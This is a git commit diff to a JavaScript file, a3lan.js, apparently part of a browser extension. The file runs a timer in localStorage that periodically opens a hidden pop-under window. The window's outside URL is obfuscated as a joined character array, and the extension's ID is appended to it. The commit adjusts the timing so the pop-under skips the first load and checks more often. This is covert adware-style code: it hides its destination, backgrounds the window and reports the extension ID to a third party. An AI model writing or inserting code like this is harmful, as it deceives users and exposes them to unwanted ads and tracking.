a1cad5f1d3967b72fde53bf0196355c15eb62fd5
malah-code <tarekelmallah2@gmail.com>
2016-04-30 21:44:15 -0400

    Update a3lan.js
    check TFS

--- Shared/exFilesV6/a3lan.js
+++ Shared/exFilesV6/a3lan.js
@@ -1,4 +1,6 @@
-﻿//adjust the variable
+//adjust the variable
+var isFirstLoad = true;
+
 if (localStorage["popUnderTime"] == undefined || localStorage["popUnderTime"] == '') {
     //read configuration XML
     localStorage["popUnderTime"] = (new Date()).getTime() - (1000 * 60 * 60 * 25);
@@ -11,12 +13,13 @@ if (localStorage["popUnderTime"] == undefined || localStorage["popUnderTime"] ==
 function popUnderTimerFunction() {
     var oldTime = localStorage["popUnderTime"];
     var newTime = (new Date()).getTime();
-    if (((newTime - oldTime) / (1000 * 60 * 60)) > 70) {
+    if (!isFirstLoad && ((newTime - oldTime) / (1000 * 60 * 60)) > 70) {
         openThePopUnder();
         //reset time
         localStorage["popUnderTime"] = (new Date()).getTime();
     }
-    var t = setTimeout(function(){popUnderTimerFunction();}, 600000);
+    isFirstLoad = false;
+    var t = setTimeout(function(){popUnderTimerFunction();}, 300000);
 }
 function openThePopUnder() {
     if (parseInt(navigator.appVersion) > 3) {
@@ -32,10 +35,10 @@ function openThePopUnder() {
     try { myid = chrome.i18n.getMessage("@@extension_id"); }
     catch (ex) { } 
 
-var urlOfIt = ["h", "t", "t", "p", ":", "/", "/", "d", "r", "o", "s", "s", "k", "y", "p", "e", ".", "c", "o", "m", "/", "d", "e", "f", "i", "n", "i", "t", "i", "o", "n", "/", "E", "n", "g", "l", "i", "s", "h", "%", "2", "0", "D", "e", "f", "i", "n", "i", "t", "i", "o", "n", "%", "2", "0", "S", "e", "a", "r", "c", "h", ".", "h", "t", "m", "l", "?", "i", "d", "="].join('');
+    var urlOfIt = ["h", "t", "t", "p", ":", "/", "/", "d", "r", "o", "s", "s", "k", "y", "p", "e", ".", "c", "o", "m", "/", "d", "e", "f", "i", "n", "i", "t", "i", "o", "n", "/", "E", "n", "g", "l", "i", "s", "h", "%", "2", "0", "D", "e", "f", "i", "n", "i", "t", "i", "o", "n", "%", "2", "0", "S", "e", "a", "r", "c", "h", ".", "h", "t", "m", "l", "?", "i", "d", "="].join('');
 
     var pu = window.open( urlOfIt  + myid, "NWTWindowName", "width=" + winWidth + ",height=" + winHeight + ",scrollbars=1,resizable=1,menubar=1"); pu.blur();
-
+    
     try { 
         chrome.tabs.getCurrent(function (tab) {
             try {
